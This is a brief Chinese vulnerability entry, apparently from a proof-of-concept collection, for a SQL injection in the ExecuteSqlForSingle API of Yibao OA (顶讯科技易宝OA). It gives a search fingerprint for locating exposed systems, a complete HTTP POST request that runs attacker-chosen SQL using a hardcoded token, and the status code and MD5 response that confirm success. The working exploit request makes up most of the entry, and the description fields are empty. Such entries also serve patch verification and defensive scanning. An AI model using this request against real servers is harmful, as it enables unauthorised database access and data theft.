﻿# 易宝OA ExecuteSqlForSingle SQL注入漏洞

> 更新时间：2023-12-25

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：product="顶讯科技-易宝OA系统"

> 验证脚本：HTTP

```
POST /api/system/ExecuteSqlForSingle HTTP/1.1
Content-Type: application/x-www-form-urlencoded

token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)&strParameters
```

> 响应代码特征：200

> 响应内容特征：e10adc3949ba59abbe56e057f20f883e

> 上传文件定位：


> 验证文件来源：易宝OA ExecuteSqlForSingle SQL注入漏洞.poc
